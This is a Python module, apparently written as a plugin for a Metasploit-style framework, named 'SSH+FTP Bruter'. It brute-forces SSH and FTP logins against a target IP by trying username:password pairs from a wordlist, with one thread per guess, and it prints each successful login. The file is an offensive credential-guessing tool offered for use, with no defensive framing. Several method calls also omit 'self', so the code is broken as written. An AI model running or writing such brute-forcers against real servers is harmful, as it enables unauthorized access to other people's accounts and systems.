MODULE_TYPE = "auxiliary"
import pexpect
import ftplib
import threading
from collections import OrderedDict
import pyfiglet
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'SSH+FTP Bruter ',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'Bruteforces both ssh and ftp passwords given a wordlistFile',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('RHOST', ('192.168.43.1', True, 'Enter actual target')),
                ('SERVICE', ('', True, '(ssh/ftp')),
                ('WORDLIST', ('/sdcard/msf/ftpcreds.txt', True, 'Format: username:password'))
                ])
                }
    def help(self):
        print("Usage: set RHOST <ip> | set WORDLIST <path/to/file> | set SERVICE <ssh/ftp> then run")    	    
    def logo(self):
    	title = 'SSH+FTP Bruter'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    
    # SSH Brute-Force Function using pexpect
    def ssh_bruteforce(self,target, username, password):
      try:
        child = pexpect.spawn(f"ssh {username}@{target}", timeout=5)
        child.expect(["password:", "yes/no", pexpect.TIMEOUT, pexpect.EOF], timeout=5)

        if "yes/no" in child.before.decode():
            child.sendline("yes")
            child.expect("password:", timeout=5)

        child.sendline(password)
        index = child.expect(["\$ ", "Permission denied", pexpect.TIMEOUT, pexpect.EOF], timeout=5)

        if index == 0:
            print(f"[+] SSH Login Successful: {username}@{target} with password: {password}")
        else:
            print(f"[-] SSH Login Failed: {username}@{target} with password: {password}")

        child.close()
      except Exception as e:
        print(f"[!] SSH Error: {str(e)}")
    
    # FTP Brute-Force Function using ftplib
    def ftp_bruteforce(self,target, username, password):
      try:
        ftp = ftplib.FTP(target)
        ftp.login(username, password)
        print(f"[+] FTP Login Successful: {username}@{target} with password: {password}")
        ftp.quit()
      except ftplib.error_perm:
        print(f"[-] FTP Login Failed: {username}@{target} with password: {password}")
      except Exception as e:
        print(f"[!] FTP Error: {str(e)}")
        
    # Load Credentials from File
    def load_credentials(self,file_path):
      with open(file_path, "r") as f:
        return [line.strip().split(":") for line in f]
        
    # Multi-threading for Faster Execution
    def run_bruteforce(self,target, credentials_file, protocol="ssh"):
      credentials = load_credentials(credentials_file)

      for username, password in credentials:
        if protocol.lower() == "ssh":
            thread = threading.Thread(target=ssh_bruteforce, args=(target, username, password))
        elif protocol.lower() == "ftp":
            thread = threading.Thread(target=ftp_bruteforce, args=(target, username, password))
        else:
            print("[!] Unsupported Protocol")
            return
        thread.start()
        
    def execute(self):
        self.logo()
        choice = self.info['Options']['SERVICE'][0]
        target_ip = self.info['Options']['RHOST'][0]
        credentials_file = self.info['Options']['WORDLIST'][0]
        if choice == 'ssh':
            self.run_bruteforce(target_ip, credentials_file, protocol="ssh")
        elif choice == 'ftp':
            self.run_bruteforce(target_ip, credentials_file, protocol="ftp")
        
        return "[+] cracking credentials ..."
    